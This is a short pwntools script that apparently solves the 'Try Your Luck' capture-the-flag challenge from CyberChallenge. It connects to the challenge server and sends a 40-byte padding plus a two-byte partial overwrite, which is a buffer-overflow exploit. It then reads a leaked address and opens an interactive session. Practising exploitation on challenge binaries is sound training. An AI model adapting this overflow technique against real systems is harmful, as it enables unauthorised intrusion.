from pwn import *

exe = ELF("/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Week 10/Try Your Luck/try_your_luck")
context.binary = exe
p = remote("yourluck.challs.cyberchallenge.it", 6013)

print("[+] Exploiting...")
shell = b"\x3a\x38"
padding = b"A" * 40

payload = padding
payload += shell

p.send(payload)
p.recvuntil(b"lucky ")
line = p.recvline()
addr = line[40:44]
addr = hex(int.from_bytes(addr, byteorder="little"))
print("[you_won] address --> " + addr)
p.interactive()
